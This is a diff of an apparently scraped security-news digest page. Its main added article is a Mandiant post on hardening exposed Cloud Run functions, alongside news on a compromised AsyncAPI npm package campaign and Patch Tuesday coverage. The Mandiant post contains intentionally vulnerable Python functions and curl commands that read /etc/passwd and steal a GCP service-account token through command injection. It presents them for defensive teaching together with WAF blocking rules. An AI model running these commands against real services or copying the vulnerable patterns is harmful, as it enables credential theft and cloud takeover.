-Beyond patching, Microsoft's advisory notes that enabling AMSI in Full Mode on the server blunts the attack. SharePoint has been an attacker magnet since the [ToolShell chain](https://thehackernews.com/2025/07/critical-microsoft-sharepoint-flaw.html) tore through unpatched servers in 2025, and it has not stopped being one.
-[CVE-2026-56155](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-56155), an Active Directory Federation Services flaw Microsoft also flags as exploited, lets an already-authenticated attacker elevate privileges locally through weak access controls. Microsoft's own DART incident-response unit gets the credit.
-AD FS is the box that signs the tokens for the rest of the estate trusts, which is why a flaw labeled "local" on that host is worth more attention than the label suggests. Microsoft has not said what privileges it grants, or how attackers used it.
-Worth knowing for anyone tracking remediation deadlines: neither CVE is on [CISA's Known Exploited Vulnerabilities catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) as of this writing. Microsoft's own exploitability rating already marks both as exploited. Do not wait for a KEV listing to make it official.
-Microsoft also rates the SharePoint bug fairly low on severity, which is a good reminder that the severity label is not the thing to sort by this month.
-A third bug, and a SharePoint chain landing in August
-The third zero-day was publicly disclosed but is not under attack: CVE-2026-50661, another [BitLocker bypass](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50661). It needs physical access to the device, so it is not a remote emergency. Patch it, but it does not jump the queue. It continues a run of BitLocker bypasses stretching back through bitskrieg and [YellowKey](https://thehackernews.com/2026/05/microsoft-releases-mitigation-for.html) earlier this year.
-SharePoint drew a second notable fix. Rapid7 Labs disclosed [CVE-2026-55040](https://www.rapid7.com/blog/post/ve-cve-2026-55040-microsoft-sharepoint-jwt-token-authentication-bypass-fixed/), a JWT authentication bypass they built for their Pwn2Own Berlin entry. The score depends on who you ask: Rapid7 puts it at 5.3 and says Microsoft assigned it medium severity, while ZDI [reads](https://www.zerodayinitiative.com/blog/2026/7/14/the-july-2026-security-update-review) the release as Critical at 9.1.
-What it does is not in dispute. Rapid7 chained it to a separate remote code execution bug to reach unauthenticated RCE against a vulnerable server, and the RCE half is not patched yet; Microsoft is slated to fix it in August.
-That makes July bypass the fix that breaks the chain. A four-point spread on one bug also tells you what a severity number is worth this month.
-The RC4 cleanup that can break logins
-This update also finishes Microsoft's multi-year Kerberos RC4 hardening. The July rollout removes the RC4DefaultDisablementPhase rollback switch, the escape hatch admins have leaned on since Microsoft began the crackdown in January.
-After this, RC4 works only for accounts explicitly configured to allow it. If any service account in your environment still requests RC4 Kerberos tickets, it can fail authentication the moment the update lands.
-The order matters: audit first, using the RC4 audit events Microsoft added in January, then rotate the passwords on flagged service accounts, so Windows generates AES keys for them, then patch. Rotation only fixes accounts missing AES keys.
-Anything pinned to RC4 by configuration, or a legacy client that speaks nothing else, needs its own fix before the update lands. This one does not get you breached; it breaks things, but it will page you at 2am if you skip the audit.
-Why a quiet month set a record
-July is historically one of the lightest months on Microsoft's calendar, which makes a release this size stand out. Windows alone accounts for 416 of the 622, and ZDI counts 95 remote code execution bugs across the release.
-Here is where the rest sits, and what is worth pulling out of each pile:
-| Product family | CVEs | Worth pulling out |
-|---|---|---|
-| Windows | 416 | Both the AD FS zero-day (CVE-2026-56155 ) and the disclosed BitLocker bypass (CVE-2026-50661 ) live here. Top score of the release is a VMSwitch RCE, CVE-2026-57092 at 9.9. Also five DHCP RCEs, and 21 NTFS and ReFS driver bugs that ZDI reads as one shared root cause. |
-| Office | 82 | Counted once. Microsoft lists the same 82 again under a separate Office 2016 track, which is why some outlets report 164. |
-| Microsoft Edge | 46 | ZDI counts 21 as Microsoft's own rather than Chromium re-listings. |
-| Developer Tools | 27 | Security feature bypasses across Visual Studio, VS Code, and GitHub Copilot, mostly injection and path traversal. |
-| SharePoint Server | 17 | The exploited zero-day (CVE-2026-56164 ) and Rapid7's chain bypass (CVE-2026-55040 ), plus a Critical RCE pair including CVE-2026-50522 at 9.8. |
-| Azure | 11 | Nothing flagged as urgent. |
-| SQL Server | 8 | An RCE pair, CVE-2026-54117 and CVE-2026-54118 , both 8.8. |
-| Defender | 5 | Two Critical RCEs. |
-| Exchange Server | 5 | A stored XSS in Outlook Web Access, CVE-2026-55008 , at 9.6. Microsoft files it under spoofing, which undersells it. |
-| Other | 5 | Nothing flagged as urgent. |
-Counts are from Microsoft's Security Update Guide, which totals 622 unique CVEs this month. ZDI, counting independently, landed on 621, and its July review is the source for the per-family callouts.
-Microsoft called this one five days early. In a [July 9 post](https://blogs.windows.com/windowsexperience/2026/07/09/evolving-windows-vulnerability-management-to-meet-the-speed-of-ai-powered-discovery/), it told customers to expect a "higher volume of security updates included in each security release" as AI helps it uncover more issues. That work includes [MDASH](https://thehackernews.com/2026/05/microsofts-mdash-ai-system-finds-16.html), its multi-model agentic scanning system, which found 16 of the bugs in May's Patch Tuesday by itself. Microsoft has not said how many of July's 622 came out of that pipeline.
-The same automation cuts both ways. Once a patch ships, attackers can diff it against the last build, find the bug it closes, and build a working exploit before most shops have finished testing. That eats the old "wait a week" cushion and shrinks the gap to Exploit Wednesday.
-It also guts CVSS-based triage. When a release carries 600-plus CVEs and a large share are rated High or Critical, "critical" stops sorting anything. This month's two exploited bugs make the point: neither is a headline 9.8, both are mid-tier privilege flaws, and both are already in use.
-Sort by what is being exploited, using KEV, EPSS, and Microsoft's exploited flag, not by score, and patch faster than you used to. The number on the box is only going up.
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">There and Back Again: An Operators Guide on NTLM Relaying Egress</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/07/15/there-and-back-again-an-operators-guide-on-ntlm-relaying-egress/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>TL;DR &#8211; What’s old is new again. Remember coercing SMB NTLM egress tradecraft to crack challenge response back in the day? We see a lot of situations in our assessments where relaying NTLM from coerced network egress is ideal when escalating locally over C2 is unattainable or firewall rules are in play preventing WebDav relays [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/07/15/there-and-back-again-an-operators-guide-on-ntlm-relaying-egress/">There and Back Again: An Operators Guide on NTLM Relaying Egress</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">The Risk of Exposed Cloud Functions and How to Harden</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/exposed-cloud-functions-harden/" target="_blank">Original Link</a></p>
+            <div class="content-text">The Risk of Exposed Cloud Functions and How to Harden
+Mandiant
+Written by: Corné de Jong
+Introduction
+Mandiant security assessments frequently identify publicly exposed serverless applications that lack authentication, often as a result of specific business requirements. Serverless deployments typically run custom-developed code that incorporates third-party packages, making them targets for a wide range of application-level attacks, including:
+-
+Local and Remote File Inclusion (LFI/RFI)
+-
+Command Injection
+Successful exploitation of these vulnerabilities can grant an attacker full control over the underlying container instance. Such access can serve as a foothold that may ultimately lead to a full compromise of the victim’s cloud environment.
+Based on lessons learned in customer engagements, in this blog post we describe attack scenarios and provide actionable guidance on how to secure serverless environments. While this analysis focuses on hardening strategies for Google Cloud Run services and functions that must remain publicly accessible, these principles apply universally to any public serverless deployment.
+What are Serverless Applications?
+Serverless applications, also described as Function-as-a-Service (FaaS), allow the deployment of individual blocks of code as microservices within a flexible, decoupled, and event-driven cloud architecture without the need to manage underlying infrastructure. These services enable applications and automations to scale automatically and deploy instantly, removing operational overhead. Serverless services underpin major e-commerce, media, payment processing applications, and AI usage.
+The rapid expansion of generative AI adoption is a significant driver of increased serverless architecture use. AI workflows, including chatbot interactions, image generation, “vibe-coding”, and multi-step AI agents rely on serverless functions to complete tasks for users. This growth has made securing serverless environments a more pressing challenge for enterprise security teams.
+Risks of Serverless Application Attacks
+Publicly exposed serverless workloads can serve as an initial access point for threat actors. As noted, these services may contain vulnerabilities within the code, imported packages, or the underlying runtime environment.
+Once an entry point is exploited, attackers typically attempt to escalate privileges or move laterally. Common techniques observed include:
+-
+Extracting secrets stored directly within the application code.
+-
+Reviewing application logic and sensitive data to identify further attack vectors within the environment.
+-
+Exfiltrating service account bearer tokens from the metadata server following successful Remote Code Execution (RCE).
+Leveraging these compromised secrets or service accounts allows threat actors to pivot to adjacent systems and workloads, potentially resulting in a total environment takeover if proper hardening strategies are not in place.
+Example Attack Scenarios
+The following simplified scenarios illustrate how serverless functions can be compromised and how attackers pivot after achieving initial code execution.
+Local File Inclusion (LFI)
+In the following Cloud Run example, a Python/Flask function accepts user-controlled input to open a file without performing proper validation. This pattern is an example of a Local File Inclusion (LFI) vulnerability.
+import functions_framework
+@functions_framework.http
+def hello_http(request):
+request_json = request.get_json(silent=True)
+request_args = request.args
+if request_json and 'file' in request_json:
+file = request_json['file']
+elif request_args and 'file' in request_args:
+file = request_args['file']
+# VULNERABILITY: The 'file' parameter is used directly in open()
+# without validation, allowing arbitrary file access
+with open(file, 'r') as resp:
+filedata = resp.read()
+return 'local file data {}!'.format(filedata)
+Figure 1: Vulnerable Python/Flask function accepting unvalidated user input to open files
+This vulnerability allows an attacker to request sensitive files from the Cloud Run instance by using curl
+to send a POST request via the file
+parameter:
+curl -X POST https://cloudrun01-abc.europe-west3.run.app/ -H "Content-Type: application/json" -d '{"file": "main.py"}'
+Figure 2: curl POST request targeting the file parameter
+The response provides the complete main.py
+source code. An attacker can analyze the code for:
+-
+Hardcoded secrets such as API keys, database credentials, or authentication tokens
+-
+Business logic flaws and additional injection points
+-
+Internal service endpoints and architecture details
+-
+Import statements revealing the technology stack and potential CVE exposure
+Additionally, attackers can leverage standard ../
+directory traversal sequences to retrieve sensitive system files:
+curl -X POST https://cloudrun01-abc.europe-west3.run.app/ -H "Content-Type: application/json" -d '{"file": "../../../etc/passwd"}'
+Figure 3: curl POST request leveraging directory traversal sequences
+An LFI vulnerability allows an attacker to retrieve and fuzz various files directly from the container. Key examples include:
+-
+requirements.txt, package.json, go.mod
+: Used to identify installed packages and versions with known vulnerabilities. -
+.
+env
+files: Frequently contain sensitive environment variables or hard coded secrets. -
+Application configuration files: May contain database credentials, API keys, or service endpoints if not securely managed.
+-
+/etc/passwd, /proc/self/environ
+: Contains user information, environment variables. -
+Application logs: may contain auth tokens or PII data.
+Best Practice: Never store secrets or credentials within the source code or local container files. Utilize a dedicated secrets management solution, such as Secret Manager.
+Code Execution/Command Injection
+In the following scenario, a Python function uses shell execution methods with unsanitized user input, allowing an attacker to execute arbitrary commands.
+import functions_framework
+import subprocess
+@functions_framework.http
+def hello_http(request):
+request_json = request.get_json(silent=True)
+request_args = request.args
+if request_json and 'input' in request_json:
+input = request_json['input']
+elif request_args and 'input' in request_args:
+input = request_args['input']
+result = subprocess.run(input, shell=True,capture_output=True, text=True)
+return format(result)
+Figure 4: Python function utilizing shell execution with unsanitized user input
+This allows an attacker to execute a subsequent curl request targeting the GCP metadata service to retrieve the service account’s bearer token.
+The following request extracts the service account's OAuth 2.0 bearer token, which remains valid for 1 hour:
+curl -X POST https://cloudrun02-abc.europe-west3.run.app/ -H "Content-Type: application/json" -d "{\"input\": \"curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'\"}"
+Figure 5: Extraction of a GCP service account bearer token via a curl request
+Once obtained, an attacker can use it on an attacker-controlled system to execute Google Cloud CLI commands. For example the CLOUDSDK_AUTH_ACCESS_TOKEN
+environment variable can be set using the stolen bearer token.
+export CLOUDSDK_AUTH_ACCESS_TOKEN=”obtain bearer token”
+Figure 6: Defining CLOUDSDK_AUTH_ACCESS_TOKEN environment variable
+Attackers can then leverage Google Cloud Cloud CLI within the security context of the Cloud Run Compute service account. If deployed without best practices and thoughtful configuration controls, for example, if the Cloud Run service runs as the default compute service account with Editor permissions, this would be equivalent to a full GCP project takeover, and allow the attacker to:
+-
+Read/write/delete most GCP resources
+-
+Deploy new services and modify existing configurations
+-
+Access secrets and encryption keys
+-
+Exfiltrate data across all accessible storage systems
+-
+Establish persistent backdoors through new service accounts or SSH keys.
+Hardening Recommendations
+Mandiant recommends that organizations implement parallel approaches for effective serverless security:
+-
+Secure Software Development Lifecycle (S-SDLC): integrate security scanning, code review, least-privilege IAM into CI/CD pipelines before deployment and integrate continuous security testing;
+-
+Vibe Coding: Mandiant recommends multi-layered security enforcement for AI-generated code or "vibe coding." Organizations should isolate AI experimentation within dedicated sandbox environments and enforce strict data egress controls to protect production systems and internal data. Furthermore, development environments should be restricted to approved IDEs with human-in-the-loop capabilities, utilizing only verified plugins operating under least privilege to mitigate supply chain vulnerabilities. Finally, organizations must ensure this AI-generated software follows Secure Software Development Lifecycle (S-SDLC) controls while establishing clear internal guidelines regarding permitted use cases. Comprehensive security fundamentals for vibe coding are documented in detail within the
+[Wiz Vibe Coding Security Fundamentals blog](https://www.wiz.io/academy/ai-security/vibe-coding-security). -
+Compensating Runtime Controls: Implement the following defense-in-depth measures to limit and contain compromise even when application vulnerabilities exist;
+Segregate Public Services
+Host public-facing Cloud Run services consumed by untrusted external entities in a dedicated, isolated Google Cloud project. This ensures a compromise does not provide an immediate path to critical internal resources. The implementation of this 'Service Project' model is beyond the scope of this post; however, it is documented in detail within the [secured serverless architecture blueprint](https://docs.cloud.google.com/architecture/blueprints/serverless-blueprint).
+Identity and Access Management (IAM)
+Mandiant recommends using a custom service account for service authentication rather than the default Compute Engine service account, following the principle of least privilege. Grant only the specific permissions necessary for the Cloud Run function to operate, for example:
+-
+Cloud Storage Bucket Access: If the service only requires read access to objects from a Cloud Storage bucket, grant the
+Storage Object Viewer
+(roles/storage.objectViewer
+) role restricted to that specific bucket. -
+Secret Manager Access: If the service requires access to secrets, grant the
+Secret Manager Secret Accessor
+(roles/secretmanager.secretAccessor
+) role only to the individual secrets required. For further details on secret access from Cloud Run, refer to the[GCP documentation on configuring secrets](https://docs.cloud.google.com/run/docs/configuring/services/secrets#required_roles).
+Layer 7 Application Load Balancer (ALB) Architecture
+Restrict ingress traffic for serverless functions to internal only and use an external Layer 7 ALB to manage internet exposure. This provides:
+-
+Centralized Traffic Management: Granular control over headers and SSL policies.
+-
+Cloud Armor Integration: Web Application Firewall (WAF) support to harden applications against vulnerabilities such as Local/Remote File Inclusion (LFI/RFI) and Server-Side Request Forgery (SSRF).
+-
+Traffic Shaping: Implementation of rate limits and request limitations to prevent abuse.
+-
+Enhanced Visibility: Robust logging and log-forwarding capabilities for security monitoring.
+-
+Identity-Aware Proxy (IAP): integration support for scenarios requiring specific identity-based authentication for internal users.
+Web Application Firewall (WAF) — Cloud Armor
+[Cloud Armor](https://cloud.google.com/security/products/armor) provides WAF protections that can be integrated with the Load Balancer to filter malicious traffic. The following examples demonstrate how to configure Cloud Armor security policies to block the specific local file inclusions, remote code execution and traversal attacks previously outlined.
+Local File Inclusion
+The lfi-v33-stable
+preconfigured WAF rules can block common local file inclusion attacks ([local file inclusion reference](https://docs.cloud.google.com/armor/docs/waf-rules#local_file_inclusion_lfi)).
+evaluatePreconfiguredWaf('lfi-v33-stable', {'sensitivity': 3})
+Figure 7: Cloud Armor lfi-v33-stable WAF rule configuration
+Blocking a path traversal request ../../../etc/passwd
+resulting in a 403 forbidden:
+curl -X POST https://exampleabc01.com -H "Content-Type: application/json" -d '{"file": "../../../etc/passwd}'
+<!doctype html><meta charset="utf-8"><meta name=viewport content="width=device-width, initial-scale=1"><title>403</title>403 Forbidden
+Figure 8: Verification of Cloud Armor blocking path traversal request, resulting in a 403 forbidden
+Remote Code Execution
+The rce-v33-stable
+preconfigured WAF rules can block remote code execution attempts ([remote code execution reference](https://docs.cloud.google.com/armor/docs/waf-rules#remote_code_execution_rce)).
+evaluatePreconfiguredWaf('rce-v33-stable', {'sensitivity': 3})
+Figure 9: Cloud Armor rce-v33-stable WAF rule configuration
+Blocking the remote code execution request from the previous example results in a 403 forbidden:
+curl -X POST https://exampleabc01.com -H "Contencurl -X POST https://exampleabc01.com -H "Content-Type: application/json" -d "{\"input\": \"curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'\"}"
+<!doctype html><meta charset="utf-8"><meta name=viewport content="width=device-width, initial-scale=1"><title>403</title>403 Forbidden
+Figure 10: Verification of Cloud Armor blocking Remote Code execution, resulting in a 403 forbidden
+Serverless Architecture Controls
+Hardening Cloud Run services is only one part of a secure architecture. Because these services often connect to other Google Cloud resources, a single compromise can expose additional services. Implementing defense-in-depth is critical. Specifically, when using direct VPC egress or VPC Access connectors, use VPC Service Controls to restrict lateral movement and exfiltration through granular access policies.
+Secure Software Development Lifecycle (S-SDLC)
+While the previously outlined hardening strategies are critical, the ideal standard remains the proactive identification of vulnerabilities during the initial development stages. A deep dive into "Shift-Left" security is beyond the scope of this analysis, which focuses on mitigating risks within existing code. However, a Secure Software Development Lifecycle (S-SDLC) remains a fundamental principle. Robust code validation and continuous security testing are essential to neutralize threats before serverless functions are published externally.
+Cloud Run Threat Detection
+Beyond the hardening recommendations outlined in this post, [Google Cloud Security Command Center (SCC)](https://cloud.google.com/security/products/security-command-center) provides built-in services to detect control plane attacks against Cloud Run resources. These include detectors for credential access, reconnaissance, and the execution of scripts or reverse shells. The [Cloud Run Threat Detection](https://docs.cloud.google.com/security-command-center/docs/cloud-run-threat-detection-overview) service is available for Premium and Enterprise tiers.
+Conclusion
+Serverless applications drive agility and rapid business value. While "vibe-coding" has made it easier than ever to deploy code, this breakneck speed demands that teams integrate security early in the development lifecycle, move beyond default configurations, and prioritize a defense-in-depth strategy centered on identity and architecture.
+Acknowledgements
+This analysis would not have been possible without the assistance of Ischa Rijff, Phil Pearce, and Juraj Sucik.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
+            <h2 class="article-title">CISA warns admins to patch actively exploited SharePoint flaws</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-warns-admins-to-patch-actively-exploited-sharepoint-flaws/" target="_blank">Original Link</a></p>
+            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) warned Tuesday that attackers are actively exploiting three vulnerabilities to hack Internet-exposed on-premises SharePoint Server instances. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-6" class="article-body">
+            <h2 class="article-title">Compromised AsyncAPI npm Packages Deliver Multi-Stage Botnet Malware</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/compromised-asyncapi-npm-packages.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Four compromised npm packages in the @asyncapi namespace have been observed distributing a multi-stage botnet loader, according to findings from [OX Security](https://www.ox.security/blog/asyncapi-npm-organization-compromised-2m-weekly-downloads-affected/), [SafeDep](https://safedep.io/asyncapi-generator-supply-chain-attack-miasma-rat/), [Socket](https://socket.dev/blog/asyncapi-supply-chain-attack), and [StepSecurity](https://www.stepsecurity.io/blog/compromised-next-branch-pushes-malicious-asyncapi-generator-generator-helpers-and-generator-components-to-npm).
+The affected packages are listed below -
+- @asyncapi/generator-helpers@1.1.1
+- @asyncapi/generator-components@0.7.1
+- @asyncapi/generator@3.3.1
+- @asyncapi/specs(v6.11.2, v6.11.2-alpha.1)
+"The compromised packages deploy an obfuscated first-stage payload that downloads an encrypted second-stage payload, identified as Miasma, from IPFS," Socket said.
+The poisoned packages ship a hidden JavaScript implant, with each of them containing an injected source file that decodes to the same second-stage downloader. Unlike previous iterations that leveraged install hooks to trigger the execution of a JavaScript payload, the malicious code in this case is run when the infected module is loaded by Node.js, after which it launches a detached background node that downloads and executes the malware from IPFS.
+The next-stage payload is an encrypted JavaScript loader named "sync.js," which is written to operating system-specific paths and executed. The downloader URL is "ipfs[.]io/ipfs/QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9." The loader contains two components -
+- The encrypted final JavaScript payload, which decodes to the Miasma tasking framework
+- A large encrypted blob used by the runtime's spawn-chain framework
+The framework bundles 744 modules and is built as a command framework that supports six independent command-and-control (C2) communication channels using HTTP, Nostr relay, IPFS, BitTorrent DHT, libp2p GossipSub P2P mesh, and an Ethereum smart contract.
+Besides facilitating credential theft, AI tool poisoning, LAN lateral movement, and worm-like propagation on npm, PyPI, and Cargo registries, Miasma features a persistence mechanism of its own, setting up a systemd, crontab, macOS launchd, and Windows Registry autostart keys.
+"Although the malware has some similarities to the [Shai-Hulud and Miasma](https://thehackernews.com/2026/06/miasma-malware-targets-npm-packages-and.html) campaigns, and it contains the Miasma string multiple times inside its code, this malware isn't the same as them, nor is it attributed to the Miasma/Shai-Hulud/TeamPCP campaigns that we've seen in the past," OX Security's Moshe Siman Tov Bustan said.
+Furthermore, it incorporates a dead man's switch that monitors a stolen token and triggers a directory wipe if the token is revoked, while avoiding systems identified as sandboxes or virtual environments, as well as those that have their current language set to Russian or have security tools from CrowdStrike, SentinelOne, Microsoft Defender, CarbonBlack, Cylance, Osquery, Tanium, and Qualys installed.
+"Its clearest operational path is REST-based C2: the implant beacons to an HTTP endpoint, accepts encrypted tasking, and posts command results back to the same infrastructure. Around that core, the payload also carries support for upload transport, command ciphering, node signing, payload updates, file management, shell execution, and persistence writing."
+According to StepSecurity, the attacker is said to have gained push access to the repositories and used the project's own legitimate GitHub Actions release pipeline to publish packages with valid OIDC provenance attestations. The supply chain attack did not involve the theft of an npm token.
+"Both attacks are CI/CD pipeline compromises, not stolen npm tokens or malicious maintainers," security researcher Rohan Prabhu said. "The attacker pushed commits under a placeholder git identity and let each repository's real release workflow do the publishing via npm's GitHub OIDC trusted-publisher integration."
+"The resulting packages carry legitimate SLSA provenance attestations, proving only that the project's authorized workflow produced them, not that the triggering commits were legitimate. Provenance does not protect against a compromised push credential."
+All five malicious versions have since been unpublished from the npm registry. It's advised to treat any endpoint that imported or executed one of the affected package versions as potentially compromised. However, it bears noting that exposure depends on whether the infected module was loaded as part of a build or a developer workflow.
+"There is no preinstall/postinstall/install script anywhere in any of the three package.json files," StepSecurity said. "This dropper fires when the poisoned module is require()d during normal use of the generator: the moment a build or CI job actually calls into the library, not at npm install time."
+Update
+SafeDep has characterized the malware as "either a private, parallel build by the same operators or a separate group that adopted the Miasma brand after the source was published." Microsoft, which is tracking the malicious artifacts under the names MiasmStealer and Supychain, said the campaign executes at module-load time, unlike the more common postinstall-hook supply chain attack pattern.
+"When any consuming build or application imports a poisoned package, the injected block runs immediately," the tech giant's security research team [said](https://www.microsoft.com/en-us/security/blog/2026/07/15/unpacking-asyncapi-npm-supply-chain-compromise-import-time-payload-delivery/). "Because the trigger is an import rather than an install script, the common npm install –ignore-scripts mitigation does not neutralize it."
+Microsoft also noted that the compromise originated from a [pwn request](https://thehackernews.com/2026/06/github-updates-actionscheckout-to-block.html) against the "asyncapi/generator" repository stemming from a misconfigured GitHub Actions workflow ("pull_request_target").
+"The asyncapi/generator repository contained a workflow file that used pull_request_target to trigger on pull requests, but then checked out the pull request's code rather than the base branch," Wiz researchers Rami McCarthy and Merav Bar [said](https://www.wiz.io/blog/m-red-team-asyncapi-supply-chain-compromise-via-github-actions). "This is dangerous because pull_request_target runs in the context of the base repository with full access to secrets. When the workflow checks out attacker-controlled code from the pull request and executes it, those secrets become accessible."
+The Google-owned security firm said the potential for pwn request had been identified as far back as April 2026, when a researcher named Florence Njeri [submitted](https://github.com/asyncapi/generator/pull/2078) a proof-of-concept (PoC) payload that exploited the vulnerability. A pull request containing the fix remained open and unmerged when the attack took place on July 14, 2026.
+While the payload shares some technical characteristics with the Miasma malware framework previously documented in Shai-Hulud supply chain attacks, the activity has not been conclusively tied to a specific threat actor. "The Miasma branding may reflect code reuse, imitation, or deliberate mislabeling," Aikido Security researcher Raphael Silva [said](https://www.aikido.dev/blog/asyncapi-npm-packages-backdoored-via-github-actions). "No definitive attribution is made here."
+Further analysis has determined that several of the implemented features related to credential harvesting, AI-tool poisoning, dead man's switch, and propagation via npm, PyPI, and Cargo vectors have been toggled off, although Microsoft warned that they "could be enabled through persistence."
+(The story was updated after publication to include additional insights.)
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-3" class="article-body">
+        <div id="art-7" class="article-body">
             <h2 class="article-title">Microsoft Patches a Record 570 Security Flaws</h2>
             <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/07/microsoft-patches-a-record-570-security-flaws/" target="_blank">Original Link</a></p>
             <div class="content-text">Microsoft Corp. today released software updates to plug at least 570 security holes in its Windows operating systems and other software, almost triple the number of vulnerabilities the software giant fixed in its record-smashing Patch Tuesday release last month. Microsoft attributed the burgeoning patch counts to vulnerability discoveries aided by artificial intelligence.
@@ -169,12 +492,16 @@ Because much of this has existed for years, subtle mistakes made in various diff
 NO one person on earth can simply open and view it all. Ai is digging it out by brute force analytics that did not exist when most of it was written.
 Try to butter some bread without crumbs coming off and then get back to me.
 Humans are flawed creatures!
+Those aren’t the only options, extraordinarily confused person.
+An old joke about programming seems appropriate: “Every program has at least one bug and can be shortened by at least one instruction – from which, by induction, one can deduce that every program can be reduced to one instruction which doesn’t work.”
 Appreciate the coverage man! This month was a monster!
 How many of these AI discovered bugs are not really bugs/holes etc., but the fixes will create new, unforeseen problems?
+None.
 Many of the vulnerabilities are from chaining from one weakness to another. It takes humans time to do this, but AI does this much faster.
 Given literally decades of work fixing stability bugs in the Microsoft codebase, it is not surprising these security bugs get now found. It will likely take many of these cycles. And as noted, new defects will be introduced.
 Scrub scrub scrub!
 Nothing interesting to me this Patch Tuesday. Still the same old crap. Good write-up, as per usual. Tired of these sorts of small AI-located bugs still being counted as some sort to pump up numbers, I assume, when they are basically just bugs not flaws. My only MS system showed no improvement. So, your usual Patch Tuesday.
+It has improved security.
 Yawn.
 “Microsoft also addressed three zero-day flaws that are already being exploited in the wild.”
 CVE-2026-50661, according to Microsoft is:
@@ -183,22 +510,21 @@ Exploited: No
 Exploitability assessment: Exploitation Less Likely
 https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2026-50661
 If Microsoft used AI to write a complete Windows replacement OS fresh from the ground up, it would have almost zero security holes, require a lot less maintenance and would do away with tens of thousands of human coding and QA jobs inside Microsoft, meaning more profits for the investors!
-I have done it myself on a local LLM. It is running great (only 100MB in memory) and I think it is very secure. And because it is so great, it doesn’t require maintenance at all!</div>
+I have done it myself on a local LLM. It is running great (only 100MB in memory) and I think it is very secure. And because it is so great, it doesn’t require maintenance at all!
+Finally built out that qemu win 3.11/wfw instance with stripped out UI?
+They should probably go back to their origins and build from win 98 and windows 2000, perhaps windows XP, and drop any lineage post win 7. Let AI slug it out instead of plopping it down with win 10/win 11.
+Sincerely, that is a better option. I feel like we are not grasping the differences between how we code vs how AI code vs how Ai code vs how Dimon might code. I don’t wanna think about Dimon vibe coding. Thinking about Gates vibe coding suddenly sounds kind of fascinating, though. I do wonder how rich ex developers would vibe code now. I worry about how AI might be interested in how we all vibe code differently. Not so scary locally, damn creepy as a communistic concept. Hoping MS never patches any of my personal bugs/flaws. I am guessing those models are taking notes on the catwalk. :/
+Nonsense. It would be just another one of their expensive fiascos. LLM code generators don’t know secure from insecure, just what they’re trained on. That’s why what drew my eye in Brian’s article was the mention of the “remote code execution flaw in Microsoft Copilot”. Mindless AI shovelware creates more problems than it’ll ever solve. An OS based on it would be a nightmare.
+AI… Are you AI or not?
+Great article and important reminder about the need for regular security updates. With the increasing number of vulnerabilities being discovered, staying informed and using reliable tools has become more important than ever. Resources like https://vanced.com.co/revanced-sync-for-lemmy/ also show how open-source communities continue to create useful solutions for users who value privacy and better digital experiences.
+Impressive. Now let’s compaire: PC Mag, in 1995, reported that M$ was releasing Win95, ->in spite of over 64,000 known bugs and issues<-.
+Do we imagine that number's decreased?
+Microsoft advisory said, some Dell PC maybe cause loop reboots after July updates</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-4" class="article-body">
-            <h2 class="article-title">Progress confirms ShareFile zero-day flaw behind Storage Zone shutdown</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/progress-confirms-sharefile-zero-day-flaw-behind-storage-zone-shutdown/" target="_blank">Original Link</a></p>
-            <div class="content-text">Progress Software has confirmed that a high-severity zero-day vulnerability is behind the emergency shutdown of ShareFile Storage Zone Controllers last week and has released security updates to patch the flaw. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
+        <div id="art-8" class="article-body">
             <h2 class="article-title">Pandora’s Container Part 1: Unpacking Azure Container Security</h2>
             <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/pandoras-container-part-1-unpacking-azure-container-security" target="_blank">Original Link</a></p>
             <div class="content-text">Pandora’s Container Part 1: Unpacking Azure Container Security
@@ -499,55 +825,7 @@ Stay tuned for Part 2—coming soon!</div>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-6" class="article-body">
-            <h2 class="article-title">Microsoft Entra ID security updates: Passkeys are the default authentication method in Entra ID</h2>
